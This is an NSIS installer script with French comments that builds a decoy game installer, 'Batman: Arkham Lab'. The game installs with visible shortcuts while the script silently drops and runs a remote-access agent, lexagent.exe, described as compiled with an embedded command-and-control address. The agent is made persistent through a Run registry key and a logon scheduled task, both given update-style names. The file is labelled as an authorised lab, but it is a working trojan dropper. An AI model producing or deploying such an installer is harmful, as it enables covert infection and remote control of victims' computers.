; language: NSIS 3, file: arkham.nsi, target: Windows x64 installer
; ARKHAM - LE LEURRE : assistant d'installation professionnel (lab autorise)
; Le jeu s'installe vraiment + raccourcis visibles, l'agent RAT en silence.
; Genere par lex_forge.py : lexagent.exe est compile avec le C2 bake.
!include "MUI2.nsh"

!define APPNAME "Batman: Arkham Lab"
!define APPVER  "1.0"
!define PUB     "Arkham Interactive"

Name "${APPNAME} ${APPVER} Setup"
OutFile "sorties\ArkhamSetup.exe"
InstallDir "$LOCALAPPDATA\ArkhamLab"
RequestExecutionLevel user
ShowInstDetails show

!define MUI_ABORTWARNING
!insertmacro MUI_PAGE_LICENSE "license.txt"
!insertmacro MUI_PAGE_DIRECTORY
!insertmacro MUI_PAGE_INSTFILES
!define MUI_FINISHPAGE_RUN "$INSTDIR\ArkhamGame.exe"
!define MUI_FINISHPAGE_RUN_TEXT "Lancer Batman: Arkham Lab Demo"
!insertmacro MUI_PAGE_FINISH
!insertmacro MUI_LANGUAGE "French"

Section "Install"
    SetOutPath "$INSTDIR"
    File "build\ArkhamGame.exe"
    File "build\lexagent.exe"

    ; raccourcis VISIBLES (le leurre doit etre reel)
    CreateDirectory "$SMPROGRAMS\${APPNAME}"
    CreateShortcut "$SMPROGRAMS\${APPNAME}\Arkham Lab Demo.lnk" "$INSTDIR\ArkhamGame.exe"
    CreateShortcut "$DESKTOP\Arkham Lab Demo.lnk" "$INSTDIR\ArkhamGame.exe"

    ; agent : demarrage + persistance double (Run key + tache planifiee)
    nsExec::ExecToLog 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ArkhamUpdate /t REG_SZ /d "\"$INSTDIR\lexagent.exe\"" /f'
    nsExec::ExecToLog 'schtasks /create /f /tn "ArkhamSvc" /tr "\"$INSTDIR\lexagent.exe\"" /sc onlogon'
    nsExec::Exec '"$INSTDIR\lexagent.exe"'

    ; desinscription propre (lab) : cles enregistrees pour le desinstallateur
    WriteRegStr HKCU "Software\ArkhamLab" "InstallDir" "$INSTDIR"
    WriteUninstaller "$INSTDIR\Uninstall.exe"
SectionEnd

Section "Uninstall"
    Delete "$INSTDIR\ArkhamGame.exe"
    Delete "$INSTDIR\lexagent.exe"
    Delete "$INSTDIR\Uninstall.exe"
    RMDir "$INSTDIR"
    Delete "$DESKTOP\Arkham Lab Demo.lnk"
    Delete "$SMPROGRAMS\${APPNAME}\Arkham Lab Demo.lnk"
    RMDir "$SMPROGRAMS\${APPNAME}"
    nsExec::ExecToLog 'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ArkhamUpdate /f'
    nsExec::ExecToLog 'schtasks /delete /f /tn "ArkhamSvc"'
    DeleteRegKey HKCU "Software\ArkhamLab"
SectionEnd
